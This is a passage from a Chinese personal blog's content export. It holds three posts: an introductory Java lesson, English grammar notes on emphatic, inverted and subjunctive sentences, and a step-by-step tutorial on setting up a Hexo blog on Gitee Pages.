<p>​    Java现在的版权属于Oracle公司，Oracle公司收购了早期的SUN公司。SUN（斯坦福的大学网络，Stanford University Network）公司，这家公司是一家从事与硬件技术的公司（它不是以软件为主，实际上在其被收购之前完全没有通过软件获得任何的利润），这家公司最著名的产品是小型机，并且大量的应用在亚马逊商城上，不过回来由于整个世界上的互联网低潮，SUN公司收到了极大的冲击，所以导致其并没有后续的强劲的生命力了，终于在2007年的时候被Oracle收购（Oracle收购SUN之前最想收购SUN公司是IBM）</p>
</blockquote>
<p>​    <strong>比较崩溃的问题</strong>，一个学生去面试（2007年的时候），面试官问他，请问你如何看待Oracle收购SUN的这一举动？<br>​    <strong>收购背后的故事</strong>，现在世界上有三大著名的软件产商：Microsoft、Oracle、Adobe，在商业领域上基本上就是微软（Microsoft）和甲骨文公司（Oracle），这两家公司是直接的竞争关系，但是在整个商业体系之中有四个重要的组成部分：操作系统、数据库、中间件、编程语言；</p>
<ul>
<li>Microsoft: Window Server、SQLServer、IIS、.NET;</li>
<li>Oracle：UNIX、Oracle Database、Bacteriologic(收购)、Java（收购）。</li>
</ul>
<p>吐槽：Oracle后来变成了“疯狗”，到处撕咬使用Java开发公司的版权费用，于是Google中招了。</p>
<p>​    任何的编程语言都有自己擅长和不擅长的领域，Java是一门非常庞大的语言，而且其设计的特点：大而全，相当于所有软件功能的实现都可以使用Java来完成，但是随着后来技术的发展，更多的编程技术出现了，于是很多的使用者就开始使用一些更加简单的语言来实现一些特定的功能，你现在可以见到的大量的会联网产品实际上都是Java开发的。</p>
<h3 id="Java语言特点"><a href="#Java语言特点" class="headerlink" title="Java语言特点"></a>Java语言特点</h3><p>​    既然Java语言如此的流行，肯定有自己不少独有的特嗲，于是一起分享一下，但是从客观的角度上来讲，Java在这么多年的历史发展中还是出想过许多疲软的时候后，由于技术的阻塞所以导致了许多的不足，但是后来由于版本不断的完善，以及变成语法的不断支持，java也成功的度过了这些疲软期，关键性的问题，Java是一个世界上最流行的编程语言，所以有着大量第三方软件厂商对其进行不断的完善。</p>
<p>​    早前的Java开发实际上分为三个方向：</p>
<ul>
<li><p>JavaSE（在2005年之前被称为”J2SE“）：主要是进行单机版程序的开发，例如：开发一些图形界面等；</p>
</li>
<li><p>JavaME（在2005年之前被称为“J2ME”）：主要是进行嵌入式设备的开发，最早期的在“诺基亚（Nokia）”被大量的应用在手机游戏的开发上，而后到了Android时代基本上就被替代掉了；</p>
</li>
<li><p>JavaEE（在2005年之前被称为“J2EE”）：主要进行企业平台的搭建，实际上现在许多的互联网就使用的是JavaEE在国内和国外，Java都是最为稳定的服务器端编程首先语言，那么既然是首先语言，就一起来分析它的一些特点：</p>
<ol>
<li><p>Java语言处采用标准的编程语法结构，所以语法结构清晰，而且语法也足够简单；<br><strong>补充</strong>：标准的编程语法结构虽然看起来结构清晰，但是会造成代码过多的问题，简单的特点是相比较C++来讲；</p>
</li>
<li><p>Java语言虽然使用了C++开发，但是其并没有引入C或C++那样的指针概念，而使用了更加直观的引用来解决内存处理问题，相当于不能够直接进行内存的操作。</p>
</li>
<li><p>Java是一门面向对象的编程语言，面向对象的编程模式是现代设计的主流，但是并不是所有的开发者都认为面向对象就是最佳的程序设计，很多的开发者依然觉得编写面向过程或者是使用函数式编程会更加的简单，但是毕竟是少数；</p>
</li>
</ol>
</li>
</ul>
<h1 id="编程起步"><a href="#编程起步" class="headerlink" title="编程起步"></a>编程起步</h1><p><strong>第一个代码</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Hello&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>编译程序</strong>：javac Hello.java ——  <strong>解释程序</strong>：java Hello</p>
<p><strong>类结构</strong>：java是以类的形式运行的，所以任何的程序都必须放在一个类之中才可以执行，在java中进行类定义的时候有一个明确的要求，所有类的名称首字母必须大写，例如“<strong>D</strong>emo”、“<strong>Y</strong>ootk<strong>D</strong>emo”、“<strong>H</strong>ello<strong>D</strong>emo”，在java程序里面针对于类有两种定义模式：</p>
<p>​    <strong>形式一</strong>：public class类名称，此时要求文件名称和类名称保持一致，如果不一致则会出现编译错误，由于文件名称只有一个，所以在任何一个Java源代码程序文件里面只允许有一个public class 定义。、</p>
<p>当前程序的文件名称是“Hello.java”</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Demo&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Hello.java:1: 错误: 类 Demo 是公共的, 应在名为 Demo.java 的文件中声明</span><br><span class="line">public class Demo&#123;</span><br></pre></td></tr></table></figure></div>

<p>​    </p>
<p><strong>形式二</strong>：class类名称，由于使用class不要求类名称与文件名称保持一致，所以这个时候就可以再一个“*.java”源代码文件里面定义有若干个class。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Demo&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以正常的编译通过</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2020&#x2F;09&#x2F;19  08:38    &lt;DIR&gt;          .</span><br><span class="line">2020&#x2F;09&#x2F;19  08:38    &lt;DIR&gt;          ..</span><br><span class="line">2020&#x2F;09&#x2F;19  08:38               415 Demo.class</span><br><span class="line">2020&#x2F;09&#x2F;19  08:38                99 Hello.java</span><br><span class="line">2020&#x2F;09&#x2F;19  08:34               106 Hello.java.bak</span><br><span class="line">               3 个文件            620 字节</span><br><span class="line">               2 个目录 130,474,803,200 可用字节</span><br></pre></td></tr></table></figure></div>

<p>此时生成的是Demo.class，也就是说这个时候是根据class类名称来定义的生成的“*.class”文件名称</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">D:\yootk&gt;java Demo</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure></div>

<p>此时得使用Java Demo 才可以正常执行Hello程序。</p>
<p><strong>主方法</strong>：主方法是一个程序的起点，所有的程序都是通过主方法去执行的，在Java里面住主方法定义比较长：</p>
<p><strong>官方推荐：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public static void main(String args[])、public static void main(String [] args)</span><br></pre></td></tr></table></figure></div>

<p><strong>个性化定义：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public static void main(String yootk[])</span><br></pre></td></tr></table></figure></div>

<p>考虑 后期学习对于知识层次的讲解，所以对于主方法的定义有一个明确的说明：把主方法所在的类将其称为“主类（MainClass）”，而主类全部使用“public class”来进行声明，后面的代码里面主类名称就是文件名称。</p>
<p>屏幕输出：</p>
<p>【输出后追加换行】System.out.println()、</p>
<p>【输出后不追加换行】System.out.print()</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>特殊用途的句子</title>
    <url>/2020/08/18/%E5%BC%BA%E8%B0%83%E5%8F%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="强调句"><a href="#强调句" class="headerlink" title="强调句"></a>强调句</h1><p>句型It is …… that ……</p>
<p>I want to go to America this summer.</p>
<p>It is America that I want to go to this summer. </p>
<h1 id="倒装句"><a href="#倒装句" class="headerlink" title="倒装句"></a>倒装句</h1><p><strong>全部倒装</strong>：<strong>There be 句型 + n + 介词短语</strong></p>
<p>有……在哪里</p>
<p>现在 There is a book on the table.</p>
<p><strong>部分倒装</strong></p>
<p>相当于把陈述句变成一般疑问句</p>
<p><strong>否定词 位于句首</strong></p>
<blockquote>
<p>not、no、never、hardly、little、scarcely、seldom、not until、not only……</p>
</blockquote>
<p>I will never do it.</p>
<p>never will I do it.</p>
<p><strong>only 位于句首</strong></p>
<h1 id="虚拟语气（非真实）"><a href="#虚拟语气（非真实）" class="headerlink" title="虚拟语气（非真实）"></a>虚拟语气（非真实）</h1><p>1、不是真的。</p>
<p>2、改变时态</p>
<p>3、虚拟条件句、名词性从句中</p>
<h3 id="if虚拟条件句"><a href="#if虚拟条件句" class="headerlink" title="if虚拟条件句"></a>if虚拟条件句</h3><table>
<thead>
<tr>
<th></th>
<th>if从句</th>
<th>主句</th>
</tr>
</thead>
<tbody><tr>
<td>假设过去</td>
<td>had done</td>
<td>would +have done</td>
</tr>
<tr>
<td>假设现在</td>
<td>did(were)</td>
<td>could、should+do</td>
</tr>
<tr>
<td>假设未来</td>
<td>did(were)<br />were to do <br />should do</td>
<td>might + do</td>
</tr>
</tbody></table>
<p>If I were to have/had/should have time tomorrow, I would help him.</p>
<p><img src="https://s1.ax1x.com/2020/08/19/dlySJ0.png" alt="image"></p>
<p>如果你过去嫁给他，你现在就会是一个加油站服务员的妻子</p>
<p>If you had married him, you would be the wife of a gas station attendant.</p>
<h3 id="省略if的虚拟条件句"><a href="#省略if的虚拟条件句" class="headerlink" title="省略if的虚拟条件句"></a>省略if的虚拟条件句</h3><p>if you had joined us, we would have had more fun.</p>
<p>had you joined us, we would have had more fun. (部分倒装)</p>
<h3 id="名词性从句的虚拟语气"><a href="#名词性从句的虚拟语气" class="headerlink" title="名词性从句的虚拟语气"></a>名词性从句的虚拟语气</h3><p>表示“建议，要求，命令”v.后的宾语从句虚拟</p>
<p>从句中用（should）+ do</p>
<p>He suggested that the system should be changed.</p>
<blockquote>
<p>suggest,advise,propose,recommend,</p>
<p>order,ask,demand,insist,</p>
<p>require,request……</p>
</blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建小白“启程”</title>
    <url>/2020/07/01/hexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>这是一篇有关如何使用Gitee Pages和hexo搭建属于自己独立博客的小白教程，这也是我搭建好自己博客之后写的第一篇博客，刚开始在搭建博客的时候也是各种问度娘，所以想要自己写一篇能让大家少走弯路，<strong><em>一条龙服务开始</em></strong>。</p>
</blockquote>
<h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><blockquote>
<p><strong>Gitee Pages</strong> 可以被认为是用户编写的、托管在Gitee上的静态网页。使用Gitee Pages可以为你提供一个免费的服务器，免去了自己搭建服务器和写数据库的麻烦。此外还可以绑定自己的域名。其实也可以使用<strong>Github Pages</strong>，但是<strong>Github Pages</strong>由于是国外的所以国内访问速度太慢，我就安利大家使用<strong>Gitee Pages</strong> 。</p>
<p><strong>Hexo</strong>是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>
</blockquote>
<h1 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h1><blockquote>
<p><a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Nodo.js下载官网</a></p>
<p>按需下载相应的版本， 默认安装就可以了。</p>
<p>这是我目前使用的版本</p>
<p><a href="https://pan.baidu.com/s/1_mLki5Vx5hGdBffc33m5Ag" target="_blank" rel="noopener">百度云盘 </a>提取码: gylq</p>
</blockquote>
<h1 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h1><blockquote>
<p><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">Git下载官网</a></p>
<p>按需下载相应的版本， 默认安装就可以了。</p>
<p>这是我目前使用的版本</p>
<p><a href="https://pan.baidu.com/s/1Wg-a8lEBoDMfObg7i9S1dQ" target="_blank" rel="noopener">百度云盘 </a>提取码: gylq</p>
</blockquote>
<h2 id="检验Git是否安装成功"><a href="#检验Git是否安装成功" class="headerlink" title="检验Git是否安装成功"></a>检验Git是否安装成功</h2><blockquote>
<p>同时按下 Win 键和 R 键打开运行窗口,输入 cmd ，然后输入以下命令，有相应版本信息显示则安装成功，若不正确可以卸载软件重新安装，此外若安装成功，在桌面右键鼠标，可以看到菜单里多了 Git GUI Here 和 Git Bash Here两个选项，第一个是图形界面的Git操作，另一个是命令行，打开Git Bash here执行以下命令</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ git --version  </span><br><span class="line">$ node -v  </span><br><span class="line">$ npm -v</span><br></pre></td></tr></table></figure></div>

<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6YWZYdC5wbmc?x-oss-process=image/format,png" alt="image 20200725133233212"></p>
<blockquote>
<p>在<strong>Git Bash Here</strong>中进行上述命令操作</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6YVc2SS5wbmc?x-oss-process=image/format,png" alt="image 20200725133347942"></p>
</blockquote>
<h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><blockquote>
<p>安装所有要求后，您可以使用npm安装Hexo：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h2 id="Hexo-初始化配置"><a href="#Hexo-初始化配置" class="headerlink" title="Hexo 初始化配置"></a>Hexo 初始化配置</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ hexo init &lt;文件夹&gt; </span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>我使用的&lt;文件夹名&gt;是<strong>blog</strong>，名称随意，稍微等待几分钟估计就好会出现一个文件夹</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6QkYzUS5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>红线标注</strong>位置是你刚刚新建的文件夹路径</p>
<p>Hexo安装完成后，将会在指定文件夹中新建所需要的文件，Hexo 文件夹下的目录如下：</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6QlVVSy5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<h1 id="本地查看效果"><a href="#本地查看效果" class="headerlink" title="本地查看效果"></a>本地查看效果</h1><blockquote>
<p>执行以下命令，执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ hexo s -g</span><br></pre></td></tr></table></figure></div>

<p>首先使用<strong>cd blog</strong> 进入你的文件夹路径，然后<strong>步骤二</strong>直接使用以上命令。</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6RGRacS5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p>此时你可以打开预览 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a>效果了</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6RDJMUi5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>此时你已经基本上完成了创建博客的一半</strong></p>
</blockquote>
<h1 id="将博客部署到-Gitee-Pages-上"><a href="#将博客部署到-Gitee-Pages-上" class="headerlink" title="将博客部署到 Gitee Pages 上"></a>将博客部署到 Gitee Pages 上</h1><blockquote>
<p>到目前为止，我们的本地博客就成功搭建了，但是现在我们只能通过本地连接查看博客，我们要做的是让其他人也能够访问我们的博客，这就需要我们将博客部署到Gitee Pages上</p>
</blockquote>
<h2 id="注册-Gitee-账户"><a href="#注册-Gitee-账户" class="headerlink" title="注册 Gitee 账户"></a>注册 Gitee 账户</h2><blockquote>
<p><a href="https://gitee.com/" target="_blank" rel="noopener">官方gitee注册</a></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwWUZQSi5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<h2 id="创建项目代码库"><a href="#创建项目代码库" class="headerlink" title="创建项目代码库"></a>创建项目代码库</h2><img src="https://s1.ax1x.com/2020/07/26/apt00K.png" width = "600" />

<h2 id="安装hexo部署"><a href="#安装hexo部署" class="headerlink" title="安装hexo部署"></a>安装hexo部署</h2><blockquote>
<p>*<em>$ npm install hexo-deployer-git –save *</em></p>
<p>命令表示安装 hexo 部署到 git page 的 deployer</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwdFJYdC5wbmc?x-oss-process=image/format,png" alt="}C}MX9G S{6AE74[`U@}]4X"></p>
</blockquote>
<h1 id="将本地的-Hexo-文件更新到-Gitee-的库中"><a href="#将本地的-Hexo-文件更新到-Gitee-的库中" class="headerlink" title="将本地的 Hexo 文件更新到 Gitee 的库中"></a>将本地的 Hexo 文件更新到 Gitee 的库中</h1><blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwVVpNbi5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p>已经<strong>部署好了hexo之后</strong>找到你的<strong>blog</strong>文件夹</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwVWtHUS5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<img src="https://s1.ax1x.com/2020/07/26/apNjxA.png" width = "600" />
</blockquote>
<blockquote>
<p>接着设定好了<strong>config</strong>之后执行下面”命令”,<strong><em>注意：若出现要输入账号和密码，直接输入你gitee的用户名和密码即可，若失败可在多试几次</em></strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hexo clean（该选项可以清除缓存）</span><br><span class="line">hexo d -g</span><br></pre></td></tr></table></figure></div>

<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwVVRRcy5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><img src="https://img-blog.csdnimg.cn/20200726132023797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwVXFlMC5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>这代表你已经成功上传到了gitee上面。</strong></p>
</blockquote>
<h1 id="进行gitee-page部署"><a href="#进行gitee-page部署" class="headerlink" title="进行gitee page部署"></a>进行gitee page部署</h1><blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwYUNPMS5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwYUVGTy5wbmc?x-oss-process=image/format,png" alt="image">)<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwYTAwMC5wbmc?x-oss-process=image/format,png" alt="image">)<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwYWwwUC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<h1 id="在博客上发表文章"><a href="#在博客上发表文章" class="headerlink" title="在博客上发表文章"></a>在博客上发表文章</h1><p><strong>博客已经成功搭建了，但是我们该怎么写博客呢？</strong></p>
<p><strong>找到你的路径项目 \blog\source_posts 中</strong></p>
<blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2Fwd0NhNi5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>用编辑器编写文章</strong></p>
<p><strong>md 全称 Markdown， Markdown 是 2004 年由 John Gruberis 设计和开发的纯文本格式的语法，非常的简单实用，常用的标记符号屈指可数，几分钟即可学会， .md 文件可以使用支持 Markdown 语法的编辑器编辑，然后保存文件到 \Hexo\source_posts 文件夹下即可</strong></p>
<p>*<em>推荐 Windows 上使用 MarkdownPad2 或者小书匠 编辑器，macOS 上使用 Mou 编辑器，Linux 上使用 Remarkable编辑器，Web 端上使用CSDN *</em></p>
<p>我推荐我目前使用<strong>Typora</strong>因为此软件可以非常方便的处理排版和图片，像一个小型word</p>
<p>Typora<a href="https://pan.baidu.com/s/15QryXcrEPYYsEBCUN_Mxbg" target="_blank" rel="noopener">百度云盘</a>提取码：gylq</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwZGFDRC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<p><strong>文章标题，标签，分类，封面图片，摘要等，可以在 Front-matter 里面配置（Front-matter 是文件最上方以 — 分隔的区域，用于指定个别文件的变量，官方文档：<a href="https://hexo.io/zh-cn/docs/front-matter" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/front-matter</a> ），举个例子：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">layout: 页面布局（配合主题文档使用）</span><br><span class="line">title: 文章名称</span><br><span class="line">date: 文章日期</span><br><span class="line">comments: 文章是否开启评论</span><br><span class="line">photos: 文章封面图（仅部分主题支持）</span><br><span class="line">tags: </span><br><span class="line">  - 文章标签一</span><br><span class="line">  - 文章标签二</span><br><span class="line">categories: 文章分类</span><br><span class="line">description: 文章描述，即要在首页显示的摘要（仅部分主题支持）</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">这里是摘要</span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">这里是正文</span><br><span class="line"></span><br><span class="line">注意：description 和 &lt;!-- more --&gt; 方式显示摘要二选一即可，部分主题不支持description，每个配置英文冒号后面要空一格，不同主题配置有所差异，具体要参考主题文档</span><br></pre></td></tr></table></figure></div>



<p>当我们用编辑器写好文章后，可以使用以下命令将其推送到服务器上</p>
<blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hexo d -g </span><br></pre></td></tr></table></figure></div>

<p>记住推送了之后要在<strong>gitee page</strong>中进行更新哦</p>
</blockquote>
<h1 id="博客更换自己喜欢的主题"><a href="#博客更换自己喜欢的主题" class="headerlink" title="博客更换自己喜欢的主题"></a>博客更换自己喜欢的主题</h1><p><strong><em>博客也搭建好了，文章也会写了，默认的主题并不喜欢怎么办？现在，我们就来为自己的博客更换自己喜欢的主题。</em></strong></p>
<p><strong><a href="https://hexo.io/themes/" target="_blank" rel="noopener">hexo官方主题专栏</a>我们可以看见有许多的主题供我们选择</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2Fwd0tkUC5wbmc?x-oss-process=image/format,png" alt="image"></p>
<blockquote>
<p><strong>这里我们来用Next主题做个举例</strong></p>
<p><strong>点进行之后会出现next的使用文档</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2Fwd0RXRi5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<p>接着复制上图中的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next themes&#x2F;next</span><br></pre></td></tr></table></figure></div>
</blockquote>
<blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2Fwdzd5ZC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<p>接着下载成功之后</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMHBsUS5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p>你会发现你的目录<strong>\blog\themes</strong>出现了next主题</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMFpmVS5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p>接着修改你的config中theme指向</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMGZucy5wbmc?x-oss-process=image/format,png" alt="image 20200726101821507">)<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMHRwRC5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>成图</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMElBMC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<p>接着我们在预览一遍</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure></div>

<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwQlAzRC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwclNTTy5wbmc?x-oss-process=image/format,png" alt="image 20200726102205443"></p>
<blockquote>
<p>接着在部署更新一遍就好了，重复上面步骤，就可以拥有一个特色的个人博客了。</p>
</blockquote>
<p>这是我的博客地址 <a href="https://gylq.gitee.io/">孤桜懶契</a>  欢迎大家来访。</p>
<p>这是我博客的配置信息</p>
